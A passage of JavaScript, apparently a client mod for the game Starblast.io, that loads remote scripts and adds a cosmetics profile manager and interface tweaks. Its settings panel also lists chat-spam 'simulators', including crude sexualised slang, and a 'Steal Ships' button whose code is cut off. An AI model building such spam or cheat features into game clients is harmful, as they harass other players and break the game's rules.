                sbibt.src = 'https://cdn.jsdelivr.net/gh/officialtroller/starblast-things/stationmodels.user.js';
                document.body.appendChild(sbibt);
                let script = document.createElement('script');
                script.src = 'https://cdn.jsdelivr.net/gh/officialtroller/starblast-things/weaponmodels.user.js';
                document.body.appendChild(script);
                let sbibit = document.createElement('script');
                sbibit.src = 'https://officialtroller.github.io/sbleaderboard/JS/ecpicon.js';
                document.body.appendChild(sbibit);
                let optionsObj;
                for (let i in window) {
                    try {
                        let val = window[i];
                        if (val && val.options && typeof val.options === 'object' && val.options.badge && val.options.finish && val.options.laser) {
                            optionsObj = val;
                            break;
                        }
                    } catch (e) {}
                }
                const badges = optionsObj.options.badge;
                const materials = optionsObj.options.finish;
                const lasers = optionsObj.options.laser;
                let useraccount = null;
                let useraccounts = localStorage.multi_accounts ? JSON.parse(localStorage.getItem('multi_accounts')) : [];
                const socials = document.querySelector('.social > .sbg-gears');
                if (socials) {
                    const lock = document.createElement('i');
                    lock.className = 'sbg sbg-lock';
                    document.querySelector('.social').insertBefore(lock, socials);
                    lock.addEventListener('mousedown', async e => {
                        if (!useraccount) {
                            useraccount = document.createElement('div');
                            useraccount.id = 'settingsmenu';
                            useraccount.style.width = '300px';
                            useraccount.style.background = 'linear-gradient(-45deg, hsla(200,50%,10%,.5) 0, hsla(200,50%,50%,.15) 100%)';
                            useraccount.style.borderRadius = '20px';
                            useraccount.style.padding = '40px';
                            useraccount.style.boxShadow = '0 0 6px hsla(200,100%,80%,1)';
                            useraccount.style.position = 'fixed';
                            useraccount.style.border = '2px solid hsla(200,100%,90%,.8)';
                            useraccount.style.left = '50%';
                            useraccount.style.top = '50%';
                            useraccount.style.transform = 'translate(-50%, -50%)';
                            useraccount.style.backdropFilter = 'blur(5px)';
                            useraccount.style.webkitBackdropFilter = 'blur(5px)';
                            useraccount.style.zIndex = '9999';
                            useraccount.style.display = 'none';
                            let offsetX,
                                offsetY,
                                isDragging = false;
                            useraccount.addEventListener('mousedown', e => {
                                const target = e.target;
                                if (target.tagName !== 'INPUT' && target.tagName !== 'BUTTON' && target.type !== 'color' && target.type !== 'range' && target.type !== 'checkbox') {
                                    isDragging = true;
                                    offsetX = e.clientX - (useraccount.getBoundingClientRect().left + useraccount.offsetWidth / 2);
                                    offsetY = e.clientY - (useraccount.getBoundingClientRect().top + useraccount.offsetHeight / 2);
                                }
                            });
 
                            document.addEventListener('mousemove', e => {
                                if (!isDragging) return;
 
                                const x = e.clientX - offsetX;
                                const y = e.clientY - offsetY;
 
                                useraccount.style.left = `${x}px`;
                                useraccount.style.top = `${y}px`;
                            });
 
                            document.addEventListener('mouseup', () => {
                                isDragging = false;
                            });
                            const headertext = document.createElement('i');
                            headertext.innerText = 'Multi User Account Manager';
                            headertext.style.color = 'hsla(200,100%,90%,.8)';
                            headertext.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
                            headertext.style.userSelect = 'none';
                            headertext.style.pointerEvents = 'none';
                            headertext.style.fontStyle = 'normal';
                            const clsebtn = document.createElement('button');
                            clsebtn.textContent = 'X';
                            clsebtn.id = 'close-btn';
                            clsebtn.style.background = 'transparent';
                            clsebtn.style.borderRadius = '50%';
                            clsebtn.style.position = 'absolute';
                            clsebtn.style.height = '30px';
                            clsebtn.style.width = '30px';
                            clsebtn.style.color = 'hsla(200,100%,90%,.8)';
                            clsebtn.style.outline = 'none';
                            clsebtn.style.overflow = 'hidden';
                            clsebtn.style.cursor = 'pointer';
                            clsebtn.style.border = 'none';
                            clsebtn.style.textAlign = 'center';
                            clsebtn.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
                            clsebtn.style.top = '10px';
                            clsebtn.style.right = '10px';
                            clsebtn.style.userSelect = 'none';
                            clsebtn.addEventListener('click', function (event) {
                                closeSettings();
                            });
                            function closeSettings() {
                                var opacity1 = 1;
                                var interval = setInterval(function () {
                                    opacity1 -= 0.1;
                                    useraccount.style.opacity = opacity1;
                                    if (opacity1 <= 0) {
                                        clearInterval(interval);
                                        useraccount.remove();
                                        useraccount = null;
                                    }
                                }, 30);
                            }
                            useraccount.appendChild(clsebtn);
                            useraccount.appendChild(headertext);
                            async function renderAccounts() {
                                const accountList = useraccount.querySelector('#account-list');
                                if (accountList) {
                                    accountList.remove();
                                }
                                const addnewbtn = document.getElementById('createnewbtn');
                                if (addnewbtn) addnewbtn.remove();
 
                                const accountContainer = document.createElement('div');
                                accountContainer.id = 'account-list';
                                accountContainer.style.margin = '5px 0';
 
                                for (const player of useraccounts) {
                                    const useraccountseach = document.createElement('div');
                                    useraccountseach.style.display = 'flex';
                                    useraccountseach.style.alignItems = 'center';
                                    useraccountseach.style.margin = '5px 0';
                                    const playername = document.createElement('div');
                                    playername.textContent = player.player_name;
                                    playername.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
                                    playername.style.userSelect = 'none';
                                    playername.style.pointerEvents = 'none';
                                    playername.style.marginRight = '5px';
                                    playername.style.color = 'white';
                                    useraccountseach.appendChild(playername);
 
                                    const ecpelm = document.createElement('img');
                                    const playerecp = await window.getECPIcon(player.custom);
                                    ecpelm.src = playerecp;
                                    ecpelm.style.width = '80px';
                                    ecpelm.style.height = '40px';
                                    ecpelm.style.marginRight = '12px';
                                    ecpelm.style.userSelect = 'none';
                                    ecpelm.style.pointerEvents = 'none';
                                    const selectbtn = document.createElement('button');
                                    selectbtn.textContent = 'select';
                                    selectbtn.style.padding = '6px 10px';
                                    selectbtn.style.fontSize = '10px';
                                    selectbtn.style.cursor = 'pointer';
                                    selectbtn.style.margin = '0 5px 0 0';
                                    selectbtn.style.textAlign = 'center';
                                    selectbtn.style.background = 'radial-gradient(ellipse at center,hsla(200,50%,0%,1) 0,hsla(200,100%,80%,.5) 150%)';
                                    selectbtn.style.boxShadow = '0 0 6px hsla(200,100%,80%,1)';
                                    selectbtn.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
                                    selectbtn.style.color = 'hsla(200,100%,90%,.8)';
                                    selectbtn.style.fontFamily = 'Play, Verdana';
                                    selectbtn.style.border = '0';
                                    selectbtn.style.borderRadius = '20px';
                                    selectbtn.onclick = function () {
                                        localStorage.setItem('badge', player.custom.badge);
                                        localStorage.setItem('finish', player.custom.finish);
                                        localStorage.setItem('laser', player.custom.laser);
                                        localStorage.setItem('lastNickname', player.player_name);
                                        location.reload();
                                    };
 
                                    const removebtn = document.createElement('button');
                                    removebtn.textContent = 'remove';
                                    removebtn.style.padding = '6px 10px';
                                    removebtn.style.fontSize = '10px';
                                    removebtn.style.cursor = 'pointer';
                                    removebtn.style.margin = '0 5px 0 0';
                                    removebtn.style.textAlign = 'center';
                                    removebtn.style.background = 'radial-gradient(ellipse at center,hsla(200,50%,0%,1) 0,hsla(200,100%,80%,.5) 150%)';
                                    removebtn.style.boxShadow = '0 0 6px hsla(200,100%,80%,1)';
                                    removebtn.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
                                    removebtn.style.color = 'hsla(200,100%,90%,.8)';
                                    removebtn.style.fontFamily = 'Play, Verdana';
                                    removebtn.style.border = '0';
                                    removebtn.style.borderRadius = '20px';
                                    removebtn.onclick = function () {
                                        useraccounts = useraccounts.filter(e => e !== player);
                                        localStorage.setItem('multi_accounts', JSON.stringify(useraccounts));
                                        renderAccounts();
                                    };
 
                                    useraccountseach.appendChild(ecpelm);
                                    useraccountseach.appendChild(selectbtn);
                                    useraccountseach.appendChild(removebtn);
                                    accountContainer.appendChild(useraccountseach);
                                }
                                let addacc = null;
 
                                useraccount.appendChild(accountContainer);
                                const createnew = document.createElement('button');
                                createnew.id = 'createnewbtn';
                                createnew.textContent = 'create new profile';
                                createnew.style.padding = '6px 10px';
                                createnew.style.fontSize = '10px';
                                createnew.style.cursor = 'pointer';
                                createnew.style.margin = '5px 0 0 0';
                                createnew.style.textAlign = 'center';
                                createnew.style.background = 'radial-gradient(ellipse at center,hsla(200,50%,0%,1) 0,hsla(200,100%,80%,.5) 150%)';
                                createnew.style.boxShadow = '0 0 6px hsla(200,100%,80%,1)';
                                createnew.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
                                createnew.style.color = 'hsla(200,100%,90%,.8)';
                                createnew.style.fontFamily = 'Play, Verdana';
                                createnew.style.border = '0';
                                createnew.style.borderRadius = '20px';
                                createnew.onclick = function () {
                                    if (!addacc) {
                                        addacc = document.createElement('div');
                                        addacc.id = 'settingsmenu';
                                        addacc.style.width = '200px';
                                        addacc.style.background = 'linear-gradient(-45deg, hsla(200,50%,10%,.5) 0, hsla(200,50%,50%,.15) 100%)';
                                        addacc.style.borderRadius = '20px';
                                        addacc.style.padding = '40px';
                                        addacc.style.boxShadow = '0 0 6px hsla(200,100%,80%,1)';
                                        addacc.style.position = 'fixed';
                                        addacc.style.border = '2px solid hsla(200,100%,90%,.8)';
                                        addacc.style.left = '50%';
                                        addacc.style.top = '50%';
                                        addacc.style.transform = 'translate(-50%, -50%)';
                                        addacc.style.backdropFilter = 'blur(5px)';
                                        addacc.style.webkitBackdropFilter = 'blur(5px)';
                                        addacc.style.zIndex = '9999';
                                        addacc.style.display = 'none';
                                        let offsetX,
                                            offsetY,
                                            isDragging = false;
                                        addacc.addEventListener('mousedown', e => {
                                            const target = e.target;
                                            if (target.tagName !== 'INPUT' && target.tagName !== 'BUTTON' && target.type !== 'color' && target.type !== 'range' && target.type !== 'checkbox') {
                                                isDragging = true;
                                                offsetX = e.clientX - (addacc.getBoundingClientRect().left + addacc.offsetWidth / 2);
                                                offsetY = e.clientY - (addacc.getBoundingClientRect().top + addacc.offsetHeight / 2);
                                            }
                                        });
 
                                        document.addEventListener('mousemove', e => {
                                            if (!isDragging) return;
 
                                            const x = e.clientX - offsetX;
                                            const y = e.clientY - offsetY;
 
                                            addacc.style.left = `${x}px`;
                                            addacc.style.top = `${y}px`;
                                        });
 
                                        document.addEventListener('mouseup', () => {
                                            isDragging = false;
                                        });
                                        const headertext = document.createElement('i');
                                        headertext.innerText = 'ECP Selector';
                                        headertext.style.color = 'hsla(200,100%,90%,.8)';
                                        headertext.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
                                        headertext.style.fontSize = '25px';
                                        headertext.style.userSelect = 'none';
                                        headertext.style.pointerEvents = 'none';
                                        headertext.style.fontStyle = 'normal';
                                        const clsebtn = document.createElement('button');
                                        clsebtn.textContent = 'X';
                                        clsebtn.id = 'close-btn';
                                        clsebtn.style.background = 'transparent';
                                        clsebtn.style.borderRadius = '50%';
                                        clsebtn.style.position = 'absolute';
                                        clsebtn.style.height = '30px';
                                        clsebtn.style.width = '30px';
                                        clsebtn.style.color = 'hsla(200,100%,90%,.8)';
                                        clsebtn.style.outline = 'none';
                                        clsebtn.style.overflow = 'hidden';
                                        clsebtn.style.cursor = 'pointer';
                                        clsebtn.style.border = 'none';
                                        clsebtn.style.textAlign = 'center';
                                        clsebtn.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
                                        clsebtn.style.top = '10px';
                                        clsebtn.style.right = '10px';
                                        clsebtn.style.userSelect = 'none';
                                        clsebtn.addEventListener('click', function (event) {
                                            closeSettings();
                                        });
                                        function closeSettings() {
                                            var opacity1 = 1;
                                            var interval = setInterval(function () {
                                                opacity1 -= 0.1;
                                                addacc.style.opacity = opacity1;
                                                if (opacity1 <= 0) {
                                                    clearInterval(interval);
                                                    addacc.remove();
                                                    addacc = null;
                                                }
                                            }, 30);
                                        }
                                        const inputdiv = document.createElement('div');
                                        inputdiv.style.display = 'grid';
                                        inputdiv.style.justifyContent = 'center';
                                        const player_nameinput = document.createElement('input');
                                        player_nameinput.type = 'text';
                                        player_nameinput.placeholder = 'da best';
                                        player_nameinput.id = 'player_nameinput';
                                        player_nameinput.maxLength = '16';
                                        player_nameinput.style.background = 'hsla(200, 20%, 40%, 0.50)';
                                        player_nameinput.style.border = '2px solid rgba(204, 240, 255, .5)';
                                        player_nameinput.style.boxShadow = '0 0 5px rgba(204, 240, 255)';
                                        player_nameinput.style.marginTop = '5px';
                                        player_nameinput.style.border = 'none';
                                        player_nameinput.style.textAlign = 'center';
                                        player_nameinput.style.borderRadius = '7px';
                                        const playerlabel = document.createElement('i');
                                        playerlabel.innerText = 'Player Name: ';
                                        playerlabel.style.color = 'white';
                                        playerlabel.style.textShadow = '0 0 5px white';
                                        playerlabel.style.textAlign = 'center';
                                        playerlabel.style.userSelect = 'none';
                                        playerlabel.style.pointerEvents = 'none';
                                        playerlabel.style.fontStyle = 'normal';
                                        const arrowright = document.createElement('i');
                                        const arrowleft = document.createElement('i');
                                        arrowleft.classList = 'fa fa-caret-left';
                                        arrowleft.style.color = 'hsla(200,60%,80%,.5)';
                                        arrowleft.style.fontSize = '1.3em';
                                        arrowright.style.color = 'hsla(200,60%,80%,.5)';
                                        arrowright.style.fontSize = '1.3em';
                                        arrowright.classList = 'fa fa-caret-right';
                                        const badgename = document.createElement('i');
                                        badgename.innerText = 'Star';
                                        badgename.id = 'badgename';
                                        badgename.style.fontStyle = 'normal';
                                        badgename.style.color = 'white';
                                        badgename.style.textShadow = '0 0 5px white';
                                        badgename.style.margin = '0 15px';
                                        const badgediv = document.createElement('div');
                                        badgediv.style.display = 'flex';
                                        badgediv.style.alignItems = 'center';
                                        badgediv.style.justifyContent = 'center';
                                        const arrowright1 = document.createElement('i');
                                        const arrowleft1 = document.createElement('i');
                                        arrowleft1.classList = 'fa fa-caret-left';
                                        arrowleft1.style.color = 'hsla(200,60%,80%,.5)';
                                        arrowleft1.style.fontSize = '1.3em';
                                        arrowright1.style.color = 'hsla(200,60%,80%,.5)';
                                        arrowright1.style.fontSize = '1.3em';
                                        arrowright1.classList = 'fa fa-caret-right';
                                        const finishname = document.createElement('i');
                                        finishname.innerText = 'Carbon';
                                        finishname.style.fontStyle = 'normal';
                                        finishname.id = 'finishname';
                                        finishname.style.color = 'white';
                                        finishname.style.textShadow = '0 0 5px white';
                                        finishname.style.margin = '0 15px';
                                        const finishdiv = document.createElement('div');
                                        finishdiv.style.display = 'flex';
                                        finishdiv.style.alignItems = 'center';
                                        finishdiv.style.justifyContent = 'center';
                                        const arrowright2 = document.createElement('i');
                                        const arrowleft2 = document.createElement('i');
                                        arrowleft2.classList = 'fa fa-caret-left';
                                        arrowleft2.style.color = 'hsla(200,60%,80%,.5)';
                                        arrowleft2.style.fontSize = '1.3em';
                                        arrowright2.style.color = 'hsla(200,60%,80%,.5)';
                                        arrowright2.style.fontSize = '1.3em';
                                        arrowright2.classList = 'fa fa-caret-right';
                                        const lasername = document.createElement('i');
                                        lasername.innerText = 'Lightning';
                                        lasername.style.fontStyle = 'normal';
                                        lasername.id = 'lasername';
                                        lasername.style.color = 'white';
                                        lasername.style.textShadow = '0 0 5px white';
                                        lasername.style.margin = '0 15px';
                                        const laserdiv = document.createElement('div');
                                        laserdiv.style.display = 'flex';
                                        laserdiv.style.alignItems = 'center';
                                        laserdiv.style.justifyContent = 'center';
                                        arrowright.addEventListener('click', () => changeName(badgename, badges));
                                        arrowleft.addEventListener('click', () => changeName(badgename, badges, true));
 
                                        arrowright1.addEventListener('click', () => changeName(finishname, materials));
                                        arrowleft1.addEventListener('click', () => changeName(finishname, materials, true));
 
                                        arrowright2.addEventListener('click', () => changeName(lasername, lasers));
                                        arrowleft2.addEventListener('click', () => changeName(lasername, lasers, true));
 
                                        function changeName(element, options, isLeft = false) {
                                            const currentKey = Object.keys(options).find(key => options[key] === element.innerText);
                                            if (!currentKey) return (element.innerText = 'not found');
                                            const currentIndex = Object.keys(options).indexOf(currentKey);
                                            let newIndex = isLeft ? currentIndex - 1 : currentIndex + 1;
                                            if (newIndex < 0) newIndex = Object.keys(options).length - 1;
                                            if (newIndex >= Object.keys(options).length) newIndex = 0;
                                            element.innerText = options[Object.keys(options)[newIndex]];
                                        }
                                        badgediv.appendChild(arrowleft);
                                        badgediv.appendChild(badgename);
                                        badgediv.appendChild(arrowright);
                                        finishdiv.appendChild(arrowleft1);
                                        finishdiv.appendChild(finishname);
                                        finishdiv.appendChild(arrowright1);
                                        laserdiv.appendChild(arrowleft2);
                                        laserdiv.appendChild(lasername);
                                        laserdiv.appendChild(arrowright2);
                                        addacc.appendChild(headertext);
                                        addacc.appendChild(clsebtn);
                                        inputdiv.appendChild(playerlabel);
                                        inputdiv.appendChild(player_nameinput);
                                        inputdiv.appendChild(document.createElement('br'));
                                        addacc.appendChild(inputdiv);
                                        addacc.appendChild(document.createElement('br'));
                                        addacc.appendChild(badgediv);
                                        addacc.appendChild(document.createElement('br'));
                                        addacc.appendChild(finishdiv);
                                        addacc.appendChild(document.createElement('br'));
                                        addacc.appendChild(laserdiv);
                                        const createnew = document.createElement('button');
                                        createnew.id = 'addprofile';
                                        createnew.textContent = 'add profile';
                                        createnew.style.padding = '6px 10px';
                                        createnew.style.fontSize = '10px';
                                        createnew.style.cursor = 'pointer';
                                        createnew.style.margin = '20px 0 0 0';
                                        createnew.style.textAlign = 'center';
                                        createnew.style.background = 'radial-gradient(ellipse at center,hsla(200,50%,0%,1) 0,hsla(200,100%,80%,.5) 150%)';
                                        createnew.style.boxShadow = '0 0 6px hsla(200,100%,80%,1)';
                                        createnew.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
                                        createnew.style.color = 'hsla(200,100%,90%,.8)';
                                        createnew.style.fontFamily = 'Play, Verdana';
                                        createnew.style.border = '0';
                                        createnew.style.borderRadius = '20px';
                                        createnew.onclick = function () {
                                            const player_name = document.getElementById('player_nameinput').value;
                                            const badge = document.getElementById('badgename').innerText;
                                            const finish = document.getElementById('finishname').innerText;
                                            const laser = document.getElementById('lasername').innerText;
                                            function getkey(key, options) {
                                                return Object.keys(options).find(ke => options[ke] === key);
                                            }
                                            const newacc = {
                                                player_name: player_name,
                                                custom: {
                                                    badge: getkey(badge, badges),
                                                    finish: getkey(finish, materials),
                                                    laser: getkey(laser, lasers),
                                                },
                                            };
                                            useraccounts.push(newacc);
                                            localStorage.setItem('multi_accounts', JSON.stringify(useraccounts));
                                            renderAccounts();
                                        };
                                        addacc.appendChild(createnew);
                                        document.body.appendChild(addacc);
                                        addacc.style.display = 'grid';
                                        addacc.style.justifyContent = 'center';
                                        addacc.style.opacity = '0';
                                        let opacity = 0;
                                        const intrvl = setInterval(() => {
                                            opacity += 0.1;
                                            addacc.style.opacity = opacity;
                                            opacity > 1 && clearInterval(intrvl);
                                        }, 30);
                                    }
                                    renderAccounts();
                                };
                                useraccount.appendChild(createnew);
                            }
 
                            renderAccounts();
 
                            document.body.appendChild(useraccount);
 
                            useraccount.style.display = 'block';
                            useraccount.style.opacity = '0';
                            let opacity = 0;
                            const intrvl = setInterval(() => {
                                opacity += 0.1;
                                useraccount.style.opacity = opacity;
                                opacity > 1 && clearInterval(intrvl);
                            }, 30);
                        }
                    });
                }
                var d = document.createElement('div');
                d.id = 'blur';
                d.style.position = 'absolute';
                d.style.top = '0';
                d.style.left = '0';
                d.style.width = '100%';
                d.style.height = '100%';
                d.style.background = 'hsla(200, 72%, 61%, 0.14)';
                d.style.boxShadow = '0 4px 30px rgba(0, 0, 0, 0.1)';
                d.style.backdropFilter = 'blur(7.1px)';
                d.style.webkitBackdropFilter = 'blur(7.1px)';
                d.style.pointerEvents = 'none';
                d.style.zIndex = '0';
 
                function blur() {
                    if (localStorage.blorus === 'true' && !document.getElementById('blur') && !Client.checkgame()) {
                        document.body.appendChild(d);
                        return setInterval(function () {
                            null != window.module &&
                                'welcome' != Object.values(window.module.exports.settings).find(e => e && e.mode).mode.id &&
                                (document.getElementById('blur') && document.getElementById('blur').remove(), clearInterval());
                        });
                    } else if (localStorage.blorus === 'false' && document.getElementById('blur')) {
                        return document.getElementById('blur').remove();
                    }
                }
                let urval = setInterval(function () {
                    blur();
                    if (null != window.module && 'welcome' != Object.values(window.module.exports.settings).find(e => e && e.mode).mode.id) {
                        clearInterval(urval);
                    }
                }, 10);
 
                function loadcustomcss(m) {
                    var q = document.getElementsByTagName('head')[0];
                    var r = document.createElement('style');
                    r.setAttribute('class', 'customtheme');
                    r.setAttribute('id', 'clienttheme');
                    r.type = 'text/css';
                    r.appendChild(document.createTextNode(m));
                    q.appendChild(r);
                }
 
                function styleing() {
                    var trainingelement = document.getElementById('training');
                    var clienttheme = document.getElementById('clienttheme');
                    var facebookIcon = document.querySelector('.social .sbg-facebook');
                    var twitterIcon = document.querySelector('.social .sbg-twitter');
                    var changelog = document.getElementsByClassName(`textcentered community changelog-new`)[0];
                    var followtools = document.querySelector('followtools');
                    if (twitterIcon != null) {
                        twitterIcon.remove();
                    }
                    if (facebookIcon != null) {
                        facebookIcon.remove();
                    }
                    if (trainingelement != null) {
                        trainingelement.remove();
                    }
                    if (changelog != null) {
                        changelog.innerHTML = `\n              <a href="https://officialtroller.github.io/serverlistv3/public/index.html" target="_self"><i class='sbg sbg-world'></i><br>Server List v3</a>\n            <a href="https://starblast.io/modding.html" target="_blank"><i class='sbg sbg-modding'></i><br>Modding Space</a>\n            <a href="https://starblast.io/shipeditor/" target="_blank"><i class='sbg sbg-fly-full'></i><br>Ship Editor</a>\n            `;
                    }
                    if (!clienttheme) {
                        loadcustomcss(`#overlay,
#respawn>div.stats>i.fa.fa-envelope,
#respawn>div.stats>i.fa.fa-facebook,
#respawn>div.stats>i.fa.fa-twitter,
#respawn>div.stats>i.fa.fa-vk {
    display: none
}
 
#respawn>div.stats {
    border-radius: 20px
}
 
.social i,
.mobile-social i,
.mobile-tools i,
.stats i {
    border-radius: 50%
}
 
.inputwrapper,
.frozenbg,
.frozenbg:visited,
.slider {
    border-radius: 20px
}
 
#colors span,
.slider:before,
.colorchosen {
    border-radius: 50%
}
 
input:checked+.slider {
    background-color: #00ff00
}
 
input:checked+.slider:before {
    box-shadow: -3px 0px 12px black
}
 
.slider:before {
    box-shadow: 3px 0px 12px black
}
 
.modal::-webkit-scrollbar-track,
.modal::-webkit-scrollbar-thumb {
    border-radius: 15px
}
 
.modal::-webkit-scrollbar {
    width: 15px
}
 
.changelog-new[data-translate-base="changelog_new"] {
    border-top-right-radius: 15px;
    border-top-left-radius: 15px;
}
 
.changelog-new[data-translate-base="community"] {
    border-bottom-right-radius: 15px;
    border-bottom-left-radius: 15px;
}
 
.playbtn i {
    transition: all .1s;
}
 
.playbtn i:active,
#player button:active,
#respawn_actions button:active,
.donate-btn:active,
#donate:active,
#moddingspace:active,
#rankings:active,
#training:active {
    transform: scale(90%);
}
 
#player button,
#respawn_actions button,
.donate-btn {
    border-radius: 15px;
    transition: all .1s;
}
 
#play #game_modes {
    background: rgba(255, 255, 255, .0)
}
 
.community a {
    filter: blur(4px);
    transition: filter .5s;
}
 
.community a:hover {
    filter: none;
}
 
#player input[type="text"]:focus {
    transform: scale(1.2);
}
 
.colorchosen {
    margin: 0 0 3px 0
}
 
.inputwrapper {
    background: radial-gradient(circle, hsla(200,0%,0%,1) 0,hsla(200,0%,0%,1) 20%,hsla(200,0%,0%,1) 40%,hsla(200,20%,40%,.5) 100%);
}
 
#moddingspace {
    border-top-right-radius: 15px;
    border-top-left-radius: 15px;
}
 
#rankings {
    border-bottom-right-radius: 15px;
    border-bottom-left-radius: 15px;
}
 
.followtools a.big span {
    filter: blur(4px);
    transition: filter .5s;
}
 
.followtools a.big:hover span {
    filter: none;
}`);
                    }
                }
 
                function allowOneMinute() {
                    var input = document.getElementById('survival_time');
                    if (input != null) {
                        if (input.min == '10') {
                            input.min = '1';
                        }
                    }
                }
                setInterval(allowOneMinute, 100);
                var styintrvl = setInterval(styleing, 100);
                setTimeout(() => clearInterval(styintrvl), 1000);
 
                function runtitle() {
                    if (Client.checkgame()) {
                        window.addEventListener('blur', () => {
                            document.title = "Midori is watching you";
                        });
                    } else {
                        window.addEventListener('blur', () => {
                            document.title = "Midori is Cunny 💚";
                        });
                    }
                }
                window.addEventListener('blur', () => {
                    runtitle();
                });
                let doctitle = document.title;
                window.addEventListener('focus', () => {
                    document.title = doctitle;
                });
 
function openSettings() {
    var element = null;
    if (!element) {
        element = document.createElement('div');
        element.id = 'settingsmenu';
        // <-- nur diese drei Zeilen wurden angepasst, alles andere ist unverändert -->
        element.style.width = '250px';
        element.style.background = 'var(--chibi-ui-gradient, linear-gradient(-45deg, hsla(200,50%,10%,.5) 0, hsla(200,50%,50%,.15) 100%))';
        element.style.borderRadius = '20px';
        element.style.padding = '40px';
        element.style.boxShadow = '0 0 6px var(--chibi-ui-color2, hsla(200,100%,80%,1))';
        element.style.position = 'fixed';
        element.style.border = '2px solid var(--chibi-ui-color1, hsla(200,100%,90%,.8))';
        element.style.left = '50%';
        element.style.top = '50%';
        element.style.transform = 'translate(-50%, -50%)';
        element.style.backdropFilter = 'blur(5px)';
        element.style.webkitBackdropFilter = 'blur(5px)';
        element.style.zIndex = '9999';
        element.style.display = 'none';
 
        let offsetX, offsetY, isDragging = false;
        element.addEventListener('mousedown', e => {
            const target = e.target;
            if (target.tagName !== 'INPUT' && target.tagName !== 'BUTTON' && target.type !== 'color' && target.type !== 'range' && target.type !== 'checkbox') {
                isDragging = true;
                offsetX = e.clientX - (element.getBoundingClientRect().left + element.offsetWidth / 2);
                offsetY = e.clientY - (element.getBoundingClientRect().top + element.offsetHeight / 2);
            }
        });
 
        document.addEventListener('mousemove', e => {
            if (!isDragging) return;
            const x = e.clientX - offsetX;
            const y = e.clientY - offsetY;
            element.style.left = `${x}px`;
            element.style.top = `${y}px`;
        });
 
        document.addEventListener('mouseup', () => { isDragging = false; });
 
        // Header
        var header = document.createElement('h2');
        var headertext = document.createElement('i');
        headertext.innerText = 'Client Control Panel';
        headertext.style.color = 'hsla(200,100%,90%,.8)';
        headertext.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
        headertext.style.userSelect = 'none';
        headertext.style.pointerEvents = 'none';
        headertext.style.fontStyle = 'normal';
 
        var clsebtn = document.createElement('button');
        clsebtn.textContent = 'X';
        clsebtn.id = 'close-btn';
        clsebtn.style.background = 'transparent';
        clsebtn.style.borderRadius = '50%';
        clsebtn.style.position = 'absolute';
        clsebtn.style.height = '30px';
        clsebtn.style.width = '30px';
        clsebtn.style.color = 'hsla(200,100%,90%,.8)';
        clsebtn.style.outline = 'none';
        clsebtn.style.cursor = 'pointer';
        clsebtn.style.border = 'none';
        clsebtn.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
        clsebtn.style.top = '10px';
        clsebtn.style.right = '10px';
        clsebtn.addEventListener('click', function () { closeSettings(); });
 
        // Simulatoren Abschnitt
        var simheaderrtext = document.createElement('i');
        simheaderrtext.innerText = 'Simulators';
        simheaderrtext.style.color = 'hsla(200,100%,90%,.8)';
        simheaderrtext.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
        simheaderrtext.style.userSelect = 'none';
        simheaderrtext.style.pointerEvents = 'none';
        simheaderrtext.style.fontStyle = 'normal';
 
        var br1 = document.createElement('br');
        br1.style.userSelect = 'none';
        br1.style.pointerEvents = 'none';
 
        // --- Stop All Simulators ---
        var stopAllBtn = document.createElement('button');
        stopAllBtn.textContent = '⛔ Stop All Simulators';
        stopAllBtn.style.padding = '8px 10px';
        stopAllBtn.style.fontSize = '11px';
        stopAllBtn.style.fontWeight = 'bold';
        stopAllBtn.style.cursor = 'pointer';
        stopAllBtn.style.margin = '8px 0';
        stopAllBtn.style.textAlign = 'center';
        stopAllBtn.style.background = 'linear-gradient(90deg, #4b0000, #7a0000)';
        stopAllBtn.style.color = 'white';
        stopAllBtn.style.border = '1px solid #ff5555';
        stopAllBtn.style.borderRadius = '10px';
        stopAllBtn.style.boxShadow = '0 0 6px rgba(255,0,0,0.5)';
        stopAllBtn.onmouseenter = () => stopAllBtn.style.background = 'linear-gradient(90deg, #600000, #a00000)';
        stopAllBtn.onmouseleave = () => stopAllBtn.style.background = 'linear-gradient(90deg, #4b0000, #7a0000)';
        stopAllBtn.onclick = function() {
            if (window.Client && Client.simulator && typeof Client.simulator.stopAll === 'function') {
                Client.simulator.stopAll();
                return;
            }
            const simulators = ["troller","xspam","gspam","blankspam","nerdspam","engspam","custom"];
            let anyDisabled = false;
            simulators.forEach(name => {
                if (window[name]) {
                    window[name] = false;
                    console.log(`%c[Client]%c[Simulator] ${name} disabled`, "color:#c4bf9f", "color:#ffff00");
                    anyDisabled = true;
                }
            });
            if (anyDisabled)
                console.log("%c[Client]%c[Simulator] All Simulators disabled", "color:#c4bf9f", "color:#ffff00");
            else
                console.log("%c[Client]%c[Simulator] No simulators were running", "color:#c4bf9f", "color:#ff0000");
        };
 
        // Simulator-Liste
        const simulators = [
            {name: "Troller", text: "Me GG You no GG"},
            {name: "X Spam", text: "Thanks Spam"},
            {name: "G Spam", text: "Cunny Hmm?"},
            {name: "Blank Spam", text: "Blank Spam"},
            {name: "Nerd Spam", text: "Kill Spam"},
            {name: "engspam", text: "Thanks / Sorry Spam"},
            {name: "Custom", text: "Blank Hmm?"}
        ];
 
        // --- Other Functions ---
        var elseheaderrtext = document.createElement('i');
        elseheaderrtext.innerText = 'Other Functions';
        elseheaderrtext.style.color = 'hsla(200,100%,90%,.8)';
        elseheaderrtext.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
        elseheaderrtext.style.userSelect = 'none';
        elseheaderrtext.style.pointerEvents = 'none';
        elseheaderrtext.style.fontStyle = 'normal';
 
        var steal = document.createElement('button');
        steal.textContent = 'Steal Ships';
        steal.style.padding = '6px 10px';
        steal.style.fontSize = '10px';
        steal.style.cursor = 'pointer';
        steal.style.margin = '5px 0 0 0';
        steal.style.textAlign = 'center';
        steal.style.background = 'radial-gradient(ellipse at center,hsla(200,50%,0%,1) 0,hsla(200,100%,80%,.5) 150%)';
        steal.style.boxShadow = '0 0 6px hsla(200,100%,80%,1)';
        steal.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
